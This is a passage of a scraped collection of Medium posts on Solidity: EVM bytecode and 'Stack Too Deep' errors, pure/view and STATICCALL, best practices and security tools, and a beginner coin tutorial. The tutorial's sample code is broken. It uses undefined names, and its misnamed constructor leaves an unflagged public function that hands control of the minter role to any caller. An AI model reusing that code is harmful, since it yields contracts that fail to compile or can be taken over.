and the value of DUPn in this line, and if I extrapolate it to the case log(a1), this rule implies we will need an opcode DUP17. But such an opcode does not exist, it points to a value lower in the stack than we can reach, which justifies the error message \u201cStack Too Deep\u201d.Satisfied with this, my natural curiosity asks the question: what role is this DUP opcode performing here? What is its purpose?Bytecode is intimidating. The last time I looked at assembly code with some level of intention of understanding it was in my teens, playing with the Spectrum\u2019s Z80 processor. I have not any experience of doing it with the EVM, so I don\u2019t plan to parse 200 lines of an assembly-like listing in my head. But Remix does offer quite good tools in this respect. In the debug tab, we can replay the transaction opcode by opcode, and at a glance see the contents of the stack, the memory and the storage, among others.Before I proceed, I\u2019d like to point you towards this series of posts in the Zeppelin blog by Alejandro Santander on the structure of assembly EVM code. It is a priceless introduction to EVM assembly, and will save me from having to explain the boilerplate. Another extremely useful link is this list of EVM opcodes, that is my favourite reference to find the functionality of each opcode. I highly recommend it.There is not much to this function, and most of the bytecode is repetitive. There are 17 occurrences of the opcode CALLDATALOAD. The first one appears in the first block of the code, before the function dispatch. It checks whether the calldata is too short (line 12), in which case the function would revert. After this, it compares the function selector to those of the methods known to the contract (in this case, only one: e898288f) and if it matches any, directs the flow to the address that implements that function. Otherwise, the call reverts.In this case, the code has called the only existing function and so the flow jumps to address 70 (line 25) to process it.The remaining 16 instances of CALLDATALOAD are exactly the number or arguments we have, they appear at exactly 9 lines intervals, and are probably responsible for processing each argument to the function. So, I ran over these lines with the Remix debugger and observed that they do load each successive argument onto the stack (I\u2019m not worried with how exactly those 9 opcodes copy these data). These are followed by 3 POP instructions that clear the part of the stack we no longer need (which was used to calculate the position in the call data of the next argument to be read). At this point, the top of the stack holds the 16th argument, the second element holds the 15th argument and so on. The 16th element of the stack is, at this stage, the first argument. This is followed by the return address of the function (0x109) and the function selector.The code then pushes into the stack the 32 byte identifier of topic 0 fcf771399d75a67a6d0e730ae98d34c40b6bfe6ebf8053b98ddf4da8c2706250, which pushes the first input out of the top 16 elements of the stack, and follows this with the DUP opcode that puts at the top of the stack the argument for the log event (eg a2 or a16).The next 20 lines or so prepare the memory to hold the argument of the log event at memory position 0x80, and guarantee the stack has in its top two positions this address and the length of the data (0x20). Then, it calls the opcode LOG1, which emits a log event with one single argument and one topic, using the data at the top 3 positions in the stack:0: 0x00000000000000000000000000000000000000000000000000000000000000801: 0x00000000000000000000000000000000000000000000000000000000000000202: 0xfcf771399d75a67a6d0e730ae98d34c40b6bfe6ebf8053b98ddf4da8c2706250There are in total five LOGn opcodes, LOG0 to LOG4, where n indicates the number of topics in the log. Topic0 is always the identifier of the event type, defined by the hash of its signature, but it can be skipped by using LOG0, which specifies an anonymous event. Each additional topic requires another slot in the stack, pushing that many more arguments out of the reachable list.This analysis shows that an event with one argument prevents one variable of being used, because topic0 is placed in the stack before the event data. This raises a couple of questions:What if we have more topics? Are they placed in the stack before the data as well?And what is the impact of more event arguments, are they PUSHed after or before the topic?To test that, I\u2019ll change the contract again. Notice that events can have any number of arguments, and up to 3 of them can be indexed. Indexed arguments become topics, while the others are lumped in the data section. My hypothesis, at this stage, is that each topic (indexed argument) will be placed in the stack before the data, and so will prevent the access to more of the early variables.In my tests, I covered several scenarios, but they all lead to the same conclusion so I will save you the minute details. I will just illustrate with another interesting and counter-intuitive case, and then draw final conclusions.First, let\u2019s try this version of the contract, where the event has one indexed value and two non-indexed ones.pragma solidity ^0.4.24;contract TestStackError {  event LogValue(uint indexed a1, uint a2, uint a3);  function logArg(uint a1, uint a2, uint a3, uint a4,\tuint a5, uint a6, uint a7, uint a8,\tuint a9, uint a10, uint a11, uint a12,\tuint a13, uint a14, uint a15, uint a16  ) public {    emit LogValue(a2, a3, a4);  }}The bytecode for this function (after the function dispatch) until the event is emitted is this:265 JUMPDEST266 DUP15267 PUSH32 a5397a5faa0ec7cfb89428503b91a13bbd737592f7561e6773fa3e1458c8735c300 DUP16301 DUP16302 PUSH1 40304 MLOAD305 DUP1306 DUP4307 DUP2308 MSTORE309 PUSH1 20311 ADD312 DUP3313 DUP2314 MSTORE315 PUSH1 20317 ADD318 SWAP3319 POP320 POP321 POP322 PUSH1 40324 MLOAD325 DUP1326 SWAP2327 SUB328 SWAP1329 LOG2The opcode that emits the event is LOG2. This means we have two topics, one the default topic0 (ie the event signature) and the other the only indexed argument in the event signature. The remaining two values are grouped in memory.If we check Ethervm for this opcode, we see that the last value read from stack, and the first to be pushed onto it, is topic1, that is, the indexed argument \u2014 a2. Initially, this is placed at position 15 of the stack. The opcode DUP15 places a copy of the value at the top of the stack, and consequently pushes all the other arguments down. From now on, for example, a2 is in position 16, and a1 is in position 17.The next instruction pushes a 32-bit value to the stack, that simply corresponds to topic 0. This value is hardcoded. This also has the effect of pushing again the arguments down. Now, a2 is in position 17.The following instructions are two DUP16 opcodes. The first one copies the value at position 16, which is currently the third argument, a3. But since this pushes a new element onto the stack, when the next opcode is called DUP16 will copy the fourth argument to the function, a4. At this stage, at the top of the stack we have the data for the event (two words), the indexed argument and the event unique identifier.The following lines copy the first two values to memory:(302\u2013305): places the contents of memory 0x40 at the top of the stack, twice. This is the position in memory where the event data will be located (and is 0x80 in my execution).(306\u2013308): places the first data word at the first free position in memory (ie places a3 in position 0x80)(309\u2013311):places the next free position in memory at the top of the stack(312\u2013314): places the second data word at the next free position in memory (ie places a4in position 0xa0)(315\u2013321): calculates the next free position in memory and leaves it at the top of the stack, after eliminating values that are no longer needed.(322\u2013327): finds the length of the data submitted to the event, by subtracting the initial address of next free position in memory from the current value of that position (held at the top of the stack).(328): reorders the first two elements of the stack, making the first element the beginning of the event data, and the second address the length of this data.(329): finally calls the logging opcode.I gave this detailed explanation so that you can understand how this process works, if you wish. In that case, perhaps you can now explain the next apparent oddity. Change only the signature of the event to:event LogValue(uint a1, uint indexed a2, uint a3);Yep, another Stack Too Deep error. Can you see what is causing it?\u2026\u2026\u2026\u2026\u2026\u2026The bytecode does not change much. We still have the same number of topics, so the opcode at the end will still be LOG2. And it still expects to receive its arguments in the same order, that is, the topics first, then the data.Now, the second topic must be loaded first, so a3 would be the first value to be pushed to the stack with a DUP14. Then topic0 would be pushed. Now, the EVM would place at the top of the stack the two arguments it needs to store in memory, a2 and a4. These were originally at positions 15 and 13. However, the EVM has made two pushes already, which makes these positions 17 and 15. It is impossible to place the first value in the stack (DUP17 does not exist) and so the compilation errors.So now that we understand this, I try changing just one more thing, the log function to:emit LogValue(a3, a2, a4);This code works, since it corresponds very closely to the last block before I changed the order of the indexed arguments. In that code, the indexed value of the event was called with a2. In this version, it is still a2 that is passed to that position, and the others remain the same. The bytecode explanation is virtually the same.ConclusionThis has been a long post. If you have arrived this far, it is worth leaving you with an organised view of what is happening, so that you can go back to your programs and think if your \u201cStack Too Deep\u201d errors could have been caused by a similar behaviour. Although this post covers only the case of emitting events, other functions will use other opcodes, but will still have the same logic, in copying the function arguments (or intermediate values) to the stack when some computation is needed.So here are some streamlined notes to keep in mind:When a function is called, a stack frame is created. This includes, from bottom to top:the function selectorthe return addressthe leftmost value-type argument of the function\u2026the rightmost value-type argument of the function\u201cStack Too Deep\u201d errors depend on the central opcode of an action (eg arithmetic, hashing, calling another function, emitting events, etc.)If these central operations are performed on pure function arguments, the order in which they are passed to the function may decide the occurrence of a \u201cStack Too Deep\u201d error. (Stack slots can also be used for intermediate calculations and local variables, but I intend to study those in a later post.)It is crucial to know the number and order of the arguments for the opcode. These arguments are typically read from the stack (the only exception is the PUSH opcode).Opcode arguments have to be pushed to the stack before executing the opcode. Each PUSH moves the function arguments down at least one slot. The function arguments deeper in the stack are the ones that were processed first, that is, the leftmost ones in the function signature.If some of the function arguments are not used in that opcode operation, then they should come first in the function signature, to reduce the chances that opcode arguments will be off-reach when they need to be stacked.Opcodes use arguments at different levels in the stack. Deeper levels are pushed first. If an argument is pushed after another, it should appear in the function signature after the former as well, otherwise it would push the other one down the stack before it could be used. Example:Consider an event with two indexed arguments t1 and t2 in this order, that is called inside a function with several arguments, among which a1 coming before a2If the event is emitted with t1 = a1 and t2 = a2, the opcode LOG3 will be called.Before calling this opcode, t2 = a2 will be pushed first into the stack.This will push a1 down and put it at risk of being unreachable when the time comes to push the value of t1 = a1.This would be avoided if a1 came after a2 in the function signature, since it would be higher in the stack than a2. Assuming a2 was reachable when it was pushed, so would be a1 afterwards.The above post concentrated on LOGn opcodes only, in particular on versions requiring 3 or 4 arguments in the stack. A more difficult case will be calling functions in other contracts or libraries, since the opcodes CALL and DELEGATECALL take 7 or 6 input arguments each, with a lot more possibilities of interaction between the opcode and function arguments.I hope this gives you some clues on how to debug and handle \u201cStack Too Deep\u201d errors. There is a lot more to say, but that will have to wait for other opportunities.Until next time.Alexandre Pinto \u2014 Blockchain developer at Artos (Aventus Ecosystem Party)Alex is a software engineer at Artos, our ecosystem partner, working on the blockchain engineering team. He has 20 years of experience working in technology, completing a PhD in Computer Science as well as a post-doctorate in Cryptography. As part of his research, Alex has published papers on Kolmogorov Complexity, Cryptography, Database Anonymization and Code Obfuscation.Pinto also spent seven years lecturing at the University Institute of Maia, including directing the degree programmes for BSc Computer Science and Information Systems and Software.This article was originally posted on his blog.Since you are here, we would love if you connected with us on Telegram,Reddit, Twitter, Facebook, Youtube, Instagram and LinkedIn.Also, we have started a LinkedIn Group for ticketing developers/other developers to engage, join us and start a conversation.", "responses": 1, "tags": ["Ethereum", "Solidity", "Blockchain", "Solidity Errors", "Coding"]}, {"title": "Solidity Learning: State Specifiers and STATICCALL", "post_link": "https://medium.com/blockchannel/state-specifiers-and-staticcall-d50d5b2e4920?source=search_post", "author_name": "Steven McKie", "author_link": "https://medium.com/@McKie", "publish_date": "2017-09-27", "last_modified_date": "2018-04-29", "readtime": "4.52", "claps": 215, "voters": 26, "content": "Solidity Learning: State Specifiers and STATICCALLUpcoming Changes to Solidity and How They FunctionSteven McKieFollowSep 27, 2017 \u00b7 5 min readCrosspost: This post was originally written by \u201cNiran\u201d of ConsenSys and can be found here. This was posted with his permission, enjoy!One of the biggest barriers to writing and reviewing safe smart contracts is understanding when the state can be modified during a chain of function calls. Reentrancy vulnerabilities have been a huge cause for concern \u2014 attempting to simply read from another contract\u2019s storage can lead to a loss of assets if done improperly. Both Solidity and the EVM are introducing features that make it safer to ask other contracts about their storage.Solidity 0.4.16 added two new specifiers for contract functions: pure and view. Solidity 0.4.17 adds the ability to enforce those specifiers\u2014if you attempt to read or write to storage or log events in the body of a function that claims not to do so, your contract will not compile. This is disabled by default for backwards compatibility.pure was introduced to specify functions that do not read or modify the state of the blockchain, like math functions.view was introduced to specify functions that can read, but can never modify the state of the blockchain. view is an alias for constant, an existing specifier that was not enforced by the compiler.Use these specifiers to clarify the intended behavior of your functions. As you write your contracts, Solidity will suggest one of these state mutability specifiers when it detects functions that don\u2019t read and/or write to the blockchain.Beyond helping others understand your codebase, pure and view are important parts of the interface between Solidity contracts. If a function makes calls to other functions or other contracts, Solidity will check if the specifiers on those functions can violate the claims of the calling function.In addition, pure and view affect the JSON ABI that the compiler produces. The stateMutability field for a function indicates whether the function is pure, view, nonpayable, or payable. Tools can access this data without parsing the contracts themselves to aid in generating reports or visualizations that make it easier to understand contracts.Examplessimple-token-saleThe Disbursement contract in simple-token-sale allows tokens to vest gradually during a specified disbursement period. Disbursement.calcMaxWithdraw() calculates the number of tokens that can currently be withdrawn. In the current codebase the function is specified as constant. In terms of the new specifiers, it is a view function---it reads from a contract's state but it doesn't modify it.If we remove the existing constant modifier in the codebase, Solidity will detect that the function is read-only:Disbursement.sol:95:5: Warning: Function state mutability can be restricted to view    function calcMaxWithdraw()    ^Adding the view modifier as shown below makes it clear that the function only reads from the state, and allows the compiler to help us maintain that behavior through the lifetime of the codebase.If we later modify the function and violate that specifier (intentionally or not), Solidity will warn us:Disbursement.sol:102:9: Warning: Function declared as view, but this expression (potentially) modifies the state and thus requires non-payable (the default) or payable.    withdrawnTokens = 0;    ^-------------^To avoid overlooking this kind of behavior change, we can add pragma experimental \"v0.5.0\" to the file to make the compilation fail with an error instead of just logging a warning.Note that calcMaxWithdraw calls token.balanceOf, a function that can contain arbitrary code that could write to the token contract\u2019s storage and violate the view specifier on calcMaxWithdraw. Since the abstract Token class in this project specifies balanceOf as constant, Solidity knows it should be safe to call it within a view function. If we remove the constant specifier from balanceOf, Solidity will warn us (or throw a compilation error if enabled):browser/Disbursement.sol:100:27: TypeError: Function declared as view, but this expression (potentially) modifies the state and thus requires non-payable (the default) or payable.    uint maxTokens = (token.balanceOf(this) + withdrawnTokens) * (now - startDate) / disbursementPeriod;                      ^-------------------^zeppelin-solidityThe SafeMath contract in zeppelin-solidity provides math functions that throw exceptions to prevent integer overflows. It's a library contract without its own state. In the current codebase, these functions are specified as constant, which indicates that the function doesn't write to the state, but doesn't let you know if it reads from the state. In terms of the new specifiers, these are pure functions\u2014they don't read or write any state.Compiling SafeMath with the latest Solidity will throw several warnings like this one to let us know that the functions aren't just constant or view, they're pure:SafeMath.sol:27:3: Warning: Function state mutability can be restricted to pure    function add(uint256 a, uint256 b) internal constant returns (uint256) {    ^Updating these modifiers to pure communicates the behavior more precisely:function add(uint256 a, uint256 b) internal pure returns (uint256) {  uint256 c = a + b;  assert(c >= a);  return c;}STATICCALLThe Byzantium network upgrade scheduled for October 9 will add a STATICCALL opcode that enforces read-only calls at runtime. Solidity only implements the STATICCALL opcode in its assembly language. Adding pureand view specifiers does not change the opcode that will be used to call the function, so they only affect compiler errors, not any behavior on chain. In the future, calls to pure or view functions could be compiled as STATICCALL, ensuring that the developer\u2019s expectations of immutability are never violated.STATICCALL allows a subset of reentrancy vulnerabilities to be avoided: if a contract\u2019s state change depends on reading data from another contract, it can safely retrieve it without ever triggering a conflicting state change. However, if your contract\u2019s state change requires a successful state change in another contract, STATICCALL cannot be used, so you still need to take precautions against reentrancy.STATICCALL introduces new scenarios that can cause transactions to fail, which is important to consider when calling arbitrary contracts. Solidity can detect state mutability violations within a single codebase, but third-party contracts that implement standard interfaces (like tokens or registries) live in separate codebases with their own definitions of those interfaces that might be more loosely defined than the standard. Mandating the use of ethpm for standard interfaces is one potential way to make sure we can rely on Solidity\u2019s static analysis across codebases. Until then, keep your eyes open: with new behavior comes new vulnerabilities.Do you love this stuff?I\u2019m part of the team at ConsenSys Diligence. If you have a knack for diving deeply into Solidity and the EVM, and an interest in smart contract security, we\u2019re looking for people to join our smart contract audit practice (apply here).If you made it this far in the post, but don\u2019t meet the exact criteria in the job description, that\u2019s OK. Just include a message mentioning this post, and calling out your experience with, and interest in Ethereum.", "responses": 1, "tags": ["Ethereum", "Solidity", "Blockchain", "Security"]}, {"title": "Practical Advice for Solidity Developers", "post_link": "https://medium.com/quiknode/practical-advice-for-solidity-developers-f2c33b88c0e6?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2019-06-20", "last_modified_date": "2019-06-24", "readtime": "4.98", "claps": 163, "voters": 25, "content": "Practical Advice for Solidity DevelopersSmart Contract Best PracticesGaurav AgrawalFollowJun 20 \u00b7 5 min readAn average of 20,000 Smart Contracts is created every day. Over 3 Million Smart Contracts were created in November and December 2018 alone! A report shows that 60% of all Ethereum contracts have never been interacted with, less than 10% of all created contracts are unique, and less than 1% of the contracts have the source code available. Another report shows that over 25% of all Smart Contracts created have some kind of bug \ud83d\ude31. Today, we\u2019ll mention a couple of things which can help you build better Smart Contracts!K.I.S.S. Principle (Keep It Simple, Stupid)The KISS principle is well-known when designing a system. Keeping things simple decreases the likelihood of errors. So make your logical flow simple when designing a Smart Contract, so you will end up with a clean & tidy code.ReuseYou don\u2019t need to reinvent the wheel! There are already well-tested libraries and frameworks (e.g. Truffle, OpenZeppelin), which help you build and modularize your logic \u2014 use them \ud83d\ude09. Don\u2019t do things like creating your own random number generator.Software Engineering Design PatternsPatterns help us in solving some very fundamental architectural design problems. Patterns are used by millions of software throughout the word and are already a well-researched area in computer science. Understanding patterns helps you recognize problems fast and come up with better solutions for them. You can find Smart Contract / Solidity design patterns here.There is one particular design pattern which we like: Proxy Delegate. This pattern helps you to upgrade your Contract safely.Test CasesIt\u2019s best to follow TDD (Test-Driven Design): create test-cases before writing your code, and cover positive and negative test cases. Also, try to break your own code and find logical mistakes. You can use solidity-coverage to generate test coverage.Use Security ToolsSmart Contract security should be the utmost priority. You need to find all attack vectors. Smart Contract and ERC-20 tokens have a history of bugs. You can also check out Ethernaut puzzles to get familiar with the most famous security problems. You should also read Vitalik Buterin\u2019s article on Smart Contract security. There are already open source security analysis tools, which you can use to analyze your Smart Contact. Here are a few of them below:VisualizationS\u016brya \u2014 Utility tool for Smart Contract systems, offering a number of visual outputs and information about the contracts\u2019 structure. Also supports querying the function call graph.Solgraph \u2014 Generates a DOT graph that visualizes function control flow of a Solidity contract and highlights potential security vulnerabilities.EVM Lab \u2014 Rich tool package to interact with the EVM. Includes a VM, Etherchain API, and a trace-viewer.ethereum-graph-debugger \u2014 A graphical EVM debugger. Displays the entire program control flow graph.Static and Dynamic AnalysisMythril Classic \u2014 Open-source security analyzer for Solidity code and on-chain Smart Contracts.Mythril Platform \u2014 SaaS platform that allows anyone to build purpose-built security tools.Slither \u2014 Static analysis framework with detectors for many common Solidity issues. It has taint and value tracking capabilities and is written in Python.Echidna \u2014 The only available fuzzer for Ethereum software. Uses property testing to generate malicious inputs that break Smart Contracts.Manticore \u2014 Dynamic binary analysis tool with EVM support.Oyente \u2014 Analyze Ethereum code to find common vulnerabilities, based on this paper.Securify \u2014 Fully automated online static analyzer for Smart Contracts, providing a security report based on vulnerability patterns.SmartCheck \u2014 Static analysis of Solidity source code for security vulnerabilities and best practices.Octopus \u2014 Security Analysis tool for Blockchain Smart Contracts with support of EVM and (e)WASM.Known Attacks and UpdatesAlways keep yourself updated with known attacks and Solidity updates. Solidity major updates may have breaking changes. Here is a list of Smart Contract known attacks.There are a few major things you need to take care of when developing an ERC-20 token:Be aware of front-running attacks on ERC-20Prevent transferring tokens to the 0x0 addressPrevent transferring tokens to the contact addressThere is a better Ethereum standard such as ERC-223 and ERC-777, which you can use as an alternative for ERC-20. Also, Security EIPs are important to be aware of\u2026 either for understanding how the EVM works, or to get informed with best practices when developing a Smart Contract system.Documentation and ProceduresDocumentation is a very important practice when your code is going to handle potentially Millions of dollars. Documentation helps internal and external participants, auditors and independent reviewers to understand your contracts.Create specification, state machines, models which helps others to understand the system.Include a roll-out plan with your documentation.Specify the current version of the compiler.Specify known issues, attack vectors, limitation and potential remedies for them.Specify test converge and reviewers.Maintain a history & keep track of changes over time.Specify contract authors and contributors with their public contact information.Contract AuditingThere are companies which can help you audit your Smart Contract. These services are useful as experts will audit your code for potential vulnerabilities. Highly recommended if you are building a Smart Contract on which your business will depend on.Bug BountiesIt always helps to have more eyes on your code. Bug bounties are excellent in terms of ROI. Below are some tips for running bounty programs:Decide the total budget and currency for your bounty reward.Categories your budget in terms of different type of vulnerabilities.Decide a team for judging the bounty.Mention proper communication channel for reporting of bugs.Use private repos to fix the bug, involve bounty hunter in reviewing the fix.Do not delay in rewarding the bounty hunter.You can check out 0x project bug bounty program.Prepare for failureIf there is code, there is a bug \ud83d\ude04. When it comes to Smart Contracts, create a thorough plan for the worst case scenarios.There are two ways to write error-free programs; only the third one works. (Alan J. Perlis)Here are several tips which can help you to create such a plan for your token:Add a circuit breaker in your Smart Contract which will pause all kinds of transactions.Create a plan for contract upgrades, bugfixes, and improvements.Create a proper guideline and communication channel for disclosure policy.Minimize the impact of bugs and money at risk. Plan what happens in case of money loss. Recourse in case of failure (e.g. insurance, penalty fund, no recourse).ConclusionApart from the above, always optimize your Smart Contract for Gas usage. Prevention is better than the Cure, always try to plan and prevent before things go wrong. In the case of Smart Contracts, the real money will be at stake; you need to be extra careful as the programmer. Always stay updated with the latest changes in Solidity language & compiler and known attacks in the ecosystem. With Ethereum blockchain\u2019s nature of everything being public, and taking into account the current maturity of the ecosystem, guaranteeing that nothing will go wrong is extreme overconfidence (if not foolishness). So build, test, plan, and follow procedures to mitigate potential vulnerabilities in your Smart Contract. Happy (smart) coding!About QuikNodeQuikNode is building infrastructure to support the future of Web3. Since 2017, we\u2019ve worked with hundreds of developers & companies, helping scale dApps and providing high-performance Ethereum nodes. We\u2019re working on something interesting from the past few months and will be launching soon, so subscribe our newsletter for more updates!! \ud83d\ude03", "responses": 0, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Blockchain", "Web3"]}, {"title": "Ethereum Smart Contract Using Solidity, Which You Wished To Create But Didn\u2019t knew How To Start?", "post_link": "https://codeburst.io/a-simple-smart-contract-using-solidity-which-you-wished-to-create-but-didnt-knew-how-to-start-c7a6b39af1e7?source=search_post", "author_name": "Pramod Chandrayan", "author_link": "https://codeburst.io/@pramod.pandey83", "publish_date": "2017-12-28", "last_modified_date": "2018-06-14", "readtime": "8.25", "claps": 235, "voters": 23, "content": "Ethereum Smart Contract Using Solidity, Which You Wished To Create But Didn\u2019t knew How To Start?Pramod ChandrayanFollowDec 28, 2017 \u00b7 9 min readsourceBlockchain is the technology working at the core & empowering all the popular cryptocurrencies like Bitcoins, Ripple, Ethereum, Litecoins etc. It has been catching the imaginations of the masses and given them the reason to dream big. Having said that it becomes even more important for developer community & all tech entrepreneurs that they act responsibly to make sure the dreams of millions are given a proper wing so that they can fly with more enthusiasm and with a sense of security.I have already covered the blockchain basics in my previous articles-1. Blockchain Technology Part 1 : What and Why ?2. Blockchain Technology Part 2 : Smart Contract Fundamentals3. Smart Contract: A Blockchain Innovation For Non-TechiesIt is recommended that you go through all those basic fundamentals, to have the required understanding before we write our first smart contract.Assumption :You must have basic fundamental knowledge of cryptocurrencies like Bitcoin & Ethereum, Litecoin etc\u2026You should have some hands-on experience in ANY programming language or scripts (like C, Java, JavaScript, PHP, Python, Ruby, Shell etc.)We will create our first smart contract using a popular Solidity Framework . So let me first navigate you through some basics of Solidity as a whole. We will cover this journey together in following stepsWhat Is Solidity?IDE\u2019s & Tools We Need To Get Started.Getting Hands Dirty With Coding Stuff.Infographics: To keep You Informed1. What Is Solidity?Solidity is a high level language which helps developers to implement smart contracts and extracts it\u2019s essence from C++, Python & JS. Solidity language has been designed to support EVM(Ethereum Virtual Machine). Solidity is statically typed and supports inheritance. It comes loaded with a rich set of libraries to help you code with ease.Solidity is a contract-oriented, high-level language for implementing smart contracts. It has been influenced by C++, Python and JavaScript and is designed to target the Ethereum Virtual Machine (EVM). It is statically typed, supports inheritance, libraries and complex user-defined types among other features.With solidity, it is possible to create contracts for voting, crowdfunding, blind auctions, multi-signature wallets and more\u2026source: pwc2. IDE\u2019s & Tools We Need To Get Started.To get started with solidity you need IDE, Some of the popular IDE\u2019s which support solidity plugin giving you all the tools you need to write your codes are:IDE\u2019s-As per official solidity web portal :- Here are few among many IDE\u2019s which supports smart contracts development-Remix- It runs on browser and comes preloaded with code compiler & solidity run time environmentIntelliJ IDEA plugin Solidity plugin for IntelliJ IDEA (and all other JetBrains IDEs)Visual Studio Extension Solidity plugin for Microsoft Visual Studio that includes the Solidity compiler.Package for SublimeText \u2014 Solidity language syntax Solidity syntax highlighting for SublimeText editor.Ethereum Studio Specialized web IDE that also provides shell access to a complete Ethereum environment.Solidity Tools(source)Dapp- Build tool, package manager, and deployment assistant for Solidity.Solidity REPL- Try Solidity instantly with a command-line Solidity console.Solgraph- Visualize Solidity control flow and highlight potential security vulnerabilities.evmdis- EVM Disassembler that performs static analysis on the bytecode to provide a higher level of abstraction than raw EVM operations.Doxity- Documentation Generator for Solidity.Installing Solidity:Using npm / Node.js:It can be done in most portable & hassle free way using Emscripten a platform independent JS library. Here is the repository of solc-js. Download it. you will have command line tool called solcjs which you can install using npm as given below-npm install -g solcSolidity Binary Packages:To get Binary packages of Solidity click: solidity/releases.Binary packages of Solidity available at solidity/releases.Personal Packages Archive:You can slo download PPAs for Ubuntu. For the latest stable version do thissudo add-apt-repository ppa:ethereum/ethereumsudo apt-get updatesudo apt-get install solcFor Cutting edge developer version do this:sudo add-apt-repository ppa:ethereum/ethereumsudo add-apt-repository ppa:ethereum/ethereum-devsudo apt-get updatesudo apt-get install solcFor more detail about getting through with the Solidity installation please go through :Installing Solidity \u2014 Solidity 0.4.20 documentationOnce you are through configuring Solidity based on your pc/laptops Operating system, you will be all set to start writing your very first Ethereum smart contract.3. Getting Hands Dirty With Coding Stuff.Your Maiden Smart Contract Code Snippet : Are You Excited?Here We Go . \u2026\u2026\u2026.& It\u2019s Ok if you are not able to grab some of what has been written we will understand as we go about it in detail.MyFirstContract://Code Snippet 1.0pragma solidity ^0.4.0;// here we define the version of soliditycontract MyFirstContract {uint mydata;function set(uint x) public {mydata = x;}function get() public constant returns (uint) {return myData;}}Lets decode the code snippet 1.0:pragma : keyword instructs compiler how to treat the source code written. As you can see we have instructed the compiler about the version of Solidity. A contract structure has two major component-FunctionsState(Data)this datas are stored at specific address on Ethereum Blockchain.uint mydata;  it is a declaration of data state variable which has a dataype of unsigned integer(of 256 bits size)functions:-function set(uint x) public {mydata = x;}function get() public constant returns (uint) {return myData;}here the functions set and get helps you to modify or retrieve the value of the variable.Note! In order to access a state variable like mydata, you don\u2019t need the prefix this. as we get to see in many other programming language.A Crypto Coin Demo Example in Solidity-Now when you have equipped yourself with some Smart Contract basics, I hope you are excited enough to further decode this smart contract mystery.I feel :Every new skills learned should be a adventure for a developer. It should be a fuel to keep you going and to keep you inspired.See i am writing this article out of sheer excitement & with a purpose to learn more and help more fellow developers & blockchain enthusiasts.How Ethereum WorksMyFirstCoin:This code snippet has been inspired by solidity official web pageCode Snippet 2.0// sourced frompragma solidity 0.4.8;contract MyFirstCoin {/** @note Example for the Solidity Course* @dev Just for demo the simple crypto example**/address public iMinter;uint public SumTotalCoin;event CoinsMintedLog(address addressedTo, uint amount);event CoinsSentLog(address sentTo, uint amount);mapping (address => uint) balances;function Coin(uint initCoins) {iMinter = msg.sender;SumTotalCoin = initCoins;balances[iMinter] = initCoins;}/// @notice Mint the coins/// @dev This does not return any value/// @param owner address of the coin owner, amount amount of coins to be delivered to owner/// @return Nothingfunction mint(address owner, uint amount) {if (msg.sender != iMinter) return;balances[owner] += amount;SumTotalCoin += amount;CoinsMintedLog(owner, amount);}function send(address receiver, uint amount) {if (balances[msg.sender] < amount) return;balances[msg.sender] -= amount;balances[receiver] += amount;CoinsSentLog(receiver, amount);}function queryBalance(address addr) constant returns (uint balance) {return balances[addr];}function killCoin() returns (bool status) {if (msg.sender != minter) throw;selfdestruct(minter);}}Explanation Time For MyFirstCoin:address public iMinter;declares a state variable of type address that is publicly accessible. The address type is a 160-bit value that does not allow any arithmetic operations. It has public access type so that you can access these data state variable current value it holds, Without this keyword, other contracts have no way to access the variable. The function will look something like this:function minter() returns (address) { return iMinter; }mapping (address => uint) public balances;here we are creating a balance type of complex state variable which maps addresses to unsigned integer data type. Here mapping an address uses hash tables which virtually initialized such that every possible key exists and is mapped to a value whose byte-representation is all zeros.event CoinsSentLog(address sentTo, uint amount);This event is triggered within the function send where it listens to the. As soon as it is fired, the listener will also receive the arguments from, to and amount, which makes tracking transactions. To listen for this event, you can use below code snippetMyFirstCoin.Sent().watch({}, \u2018\u2019, function(error, result) {if (!error) {console.log(\u201cCoin transfer: \u201c + result.args.amount +\u201c coins were sent from \u201c + result.args.from +\u201c to \u201c + result.args.to + \u201c.\u201d);console.log(\u201cBalances now:\\n\u201d +\u201cSender: \u201c + MyFirstCoin.balances.call(result.args.from) +\u201cReceiver: \u201c + MyFirstCoin.balances.call(result.args.to));}})MyFirstCoin is the constructor which is run during creation of the contract and cannot be called afterwards. It permanently stores the address of the person creating the contract: msg (together with tx and block) is a magic global variable that contains some properties which allow access to the blockchain. msg.sender is always the address where the current (external) function call came from.functions like mint and send, will eventually hold the contracts to enquired by the users & other similar contracts. If anyone other than contract creator tries to access mint it is not possible.Only send method can be used by a person who already have some coins in their kitty to send.4. Some Infographics: To Keep You Informed:source: chipin.comWhat Next ?I hope you now have some required understanding of how to write a basic smart contract , next we will further try to understand how EVM ethereum virtual machine function and manages transactions. Some of the things which we will cover in the upcoming series of articles on \u201c Blockchain Using Solidity.\u201d -EVM OverviewEthereum AccountsTransactions Between Those Accounts& much more\u2026.Summing Up:As I have already spoken in one of my article Top 3 Technology Trends For 2018, Which Will Be A Game Changer ! that Blockchain based tech will be a hot cake in coming years and if one is looking for better career opportunity professionally he should not only keep a close eye on it, but also need to invest some serious time learning the craft of it. Banking, voting, insurance, user authentication, contracting & many more use cases will pop up as the year unfolds, and one should not just let it pass by. As a developer or as an entrepreneur it becomes really important that we adopt this trend and create some innovative solutions which can pass on the benefit to the masses.Already people who never traded in the existing share market have started to invest in their capacity on cryptos, with all excitement to grow their wealth. The ease of creating account & freedom to invest without too much regulation has fascinated many new & first time investor. This is not going to cool of any sooner.With all this open market opportunities, now onus is on all the Technology innovators & Visionaries to utilize this blockchain technology and see what they can come up with, to fire the imagination of the youth, who are going to be an early adopter of what we have to offer.Don\u2019t forget to check out my thoughts on edge computing:All About Edge Computing- How It Is Changing The Present Past & Future Of IoT?which i feel will be a tech trend to watch out in 2018 & beyond.If you are \ud83d\udc9a \ud83d\udc9a my contribution do \ud83d\udc4f \ud83d\udc4f clap , Click Here and subscribe to reach out to me for more and I would feel blessed to hear you and respond back.for more do check out : www.techprenuer.com where very often i share my learning for all you lovely readers .I am really honored with all the love & feedbacks, I have been receiving for my contribution and i am really thankful to all of you for inspiring me\u2026.Thanks A Lot & Wishing You All A Very Blissful New Year 2018, ahead.", "responses": 0, "tags": ["Ethereum", "Technology", "Business", "Cryptocurrency", "Innovation"]}, {"title": "How to Write Upgradable (Versioned) Smart Contracts in Solidity?", "post_link": "https://medium.com/hackernoon/how-to-write-upgradable-versioned-smart-contracts-in-solidity-910007057943?source=search_post", "author_name": 